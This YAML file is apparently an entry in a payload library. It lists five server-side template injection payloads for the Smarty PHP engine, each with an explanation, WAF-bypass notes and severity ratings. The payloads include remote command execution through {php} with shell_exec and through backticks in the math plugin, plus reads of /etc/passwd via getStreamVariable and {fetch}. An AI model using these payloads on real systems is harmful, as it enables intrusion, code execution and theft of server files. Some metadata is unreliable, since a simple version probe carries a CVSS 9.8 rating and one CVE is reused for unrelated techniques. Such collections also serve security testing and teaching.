- slug: smarty
  name: Smarty (PHP)
  description: SSTI payloads for the Smarty PHP template engine used in many PHP CMS and e-commerce platforms.
  difficulty: medium
  prerequisites:
  - Application uses Smarty template engine
  - User input rendered in Smarty template {}
  payloads:
  - id: ssti-smarty-001
    title: Smarty expression probe
    payload_string: '{$smarty.version}'
    how_it_works: 'Smarty uses single-brace syntax {$variable} for variable output. The {$smarty.version} expression accesses
      Smarty''s built-in reserved variable containing the template engine version. If the response contains a Smarty version
      number (e.g., 3.1.44), SSTI is confirmed on Smarty. This is a low-risk probe that reveals the exact Smarty version,
      helping the attacker select version-specific exploitation techniques.

      '
    prerequisites:
    - Input rendered in Smarty template
    waf_bypass_notes: '{$smarty} is Smarty-specific; version confirms Smarty presence'
    severity_context: CVSS 9.8 – Smarty version disclosure confirming SSTI
    cve_refs: []
    tags:
    - ssti
    - smarty
    - probe
    - php
    - version-disclosure
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: ssti-smarty-002
    title: Smarty RCE via {php} tag
    payload_string: '{php}echo shell_exec(''id'');{/php}'
    how_it_works: 'Smarty 2.x supported the {php} tag for inline PHP code execution. If enabled (php_handling = SMARTY_PHP_PASSTHRU
      or SMARTY_PHP_ALLOW), this allows arbitrary PHP execution. shell_exec() runs the ''id'' command and echo outputs the
      result. In Smarty 3.x, the {php} tag was deprecated and disabled by default, but older applications or those with security_policy->php_functions_enabled
      may still support it. This is a classic Smarty SSTI-to-RCE technique in legacy applications.

      '
    prerequisites:
    - Smarty 2.x or Smarty 3.x with php_functions_enabled
    - '{php} tag enabled in Smarty configuration'
    waf_bypass_notes: Smarty 3+ disables {php} by default; target Smarty 2.x installations
    severity_context: CVSS 9.8 – Smarty {php} tag for direct PHP code execution
    cve_refs: []
    tags:
    - ssti
    - smarty
    - php-tag
    - rce
    - legacy
    - php
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: ssti-smarty-003
    title: Smarty getStreamVariable sandbox escape
    payload_string: '{self::getStreamVariable(''file:///etc/passwd'')}'
    how_it_works: 'Smarty''s getStreamVariable() method (accessible via {self::}) reads a stream URL. Using the file:// scheme,
      this provides arbitrary file read capability. This was a documented CVE (CVE-2021-26120) in Smarty that allowed sandbox
      escape for local file read. Even when Smarty security sandbox is enabled, the getStreamVariable method could be called
      via static method syntax. This affects Smarty versions before the patched releases and is applicable to any application
      using vulnerable Smarty versions.

      '
    prerequisites:
    - Smarty version with unpatched getStreamVariable
    - Static method call syntax enabled
    waf_bypass_notes: Version-specific; check Smarty version; patch available
    severity_context: CVSS 7.5 – Smarty sandbox escape for local file read
    cve_refs:
    - CVE-2021-26120
    tags:
    - ssti
    - smarty
    - sandbox-escape
    - file-read
    - cve
    - legacy
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: ssti-smarty-004
    title: Smarty math function OS injection
    payload_string: '{math equation=''x'' format=''%s'' x=''`id`''}'
    how_it_works: 'Smarty''s {math} function plugin processes mathematical expressions. In older versions, the parameters
      were passed to PHP''s eval() after interpolation. Embedding backtick command substitution within a Smarty math parameter
      causes command execution at the PHP level. This is a Smarty plugin-specific RCE technique. The backtick-enclosed ''id''
      command executes in the PHP shell context. This technique works in Smarty versions where math plugin parameters are
      not sanitized before evaluation.

      '
    prerequisites:
    - Smarty with vulnerable math plugin
    - Older Smarty versions (pre-3.1.45 security fixes)
    waf_bypass_notes: Math plugin injection; less common signature in WAF rules
    severity_context: CVSS 9.8 – Smarty math plugin for backtick command execution
    cve_refs:
    - CVE-2021-26120
    tags:
    - ssti
    - smarty
    - math-plugin
    - backtick
    - rce
    - eval
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: ssti-smarty-005
    title: Smarty template injection via fetch
    payload_string: '{fetch file=''/etc/passwd''}'
    how_it_works: 'Smarty''s {fetch} tag reads and outputs a file or URL. When used with a local file path, it reads arbitrary
      files from the server filesystem. {fetch file=''/etc/passwd''} reads the passwd file and outputs its content directly
      in the template. This requires that {fetch} is enabled in Smarty''s security settings (it is enabled by default in unsecured
      configurations). This is a file read without code execution but provides the same credential theft capability.

      '
    prerequisites:
    - Smarty with {fetch} function enabled
    - Security sandbox not restricting file access
    waf_bypass_notes: '{fetch} may be less controlled than {php}; test in target application'
    severity_context: CVSS 7.5 – Smarty {fetch} for arbitrary file read
    cve_refs:
    - CVE-2021-26120
    tags:
    - ssti
    - smarty
    - fetch-tag
    - file-read
    - no-rce
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
